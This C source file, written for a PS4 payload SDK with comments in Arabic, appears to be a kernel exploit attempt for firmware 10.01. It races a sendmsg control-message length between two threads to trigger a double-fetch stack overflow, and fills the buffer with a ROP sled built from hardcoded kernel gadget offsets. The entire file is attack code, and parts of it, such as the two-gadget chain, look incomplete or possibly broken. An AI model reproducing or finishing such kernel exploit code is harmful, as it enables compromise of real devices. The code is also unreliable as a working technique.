#include <ps4.h>
#include <stdint.h>
#include <string.h>

// الإزاحات لنسخة 10.01
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_RET                  0x0008E0 

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

// دالة الإرسال (الخيط الأول)
void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { 
        syscall(28, global_sock, &msg, 0); 
    }
    return NULL;
}

// دالة السباق (الخيط الثاني) - استهداف ثغرة الـ Double Fetch
void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        // نغير الطول من "صغير وقانوني" إلى "كبير جداً" لكسر المكدس
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    uint64_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t step2 = kbase + OFF_RET; // لضمان عدم توقف المعالج عند 0

    global_sock = syscall(97, 2, 2, 0);
    
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    /* تطبيق الورقة البحثية: 
       المكدس يسحب 8 بايت (Quad-word). 
       سنقوم بعمل "ROP Sled" لضمان إصابة RIP مهما كانت الإزاحة.
    */
    for (int i = 0x40; i < CONTROL_LEN - 16; i += 16) {
        *(uint64_t *)(control_buf + i)     = step1; // سيذهب لـ RBP أو RIP
        *(uint64_t *)(control_buf + i + 8) = step2; // العنوان التالي في السلسلة
    }

    // إضافة Debug بسيط (اختياري إذا كنت تستخدم الشبكة)
    // printf_debug("Starting Race... kbase: %p\n", (void*)kbase);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
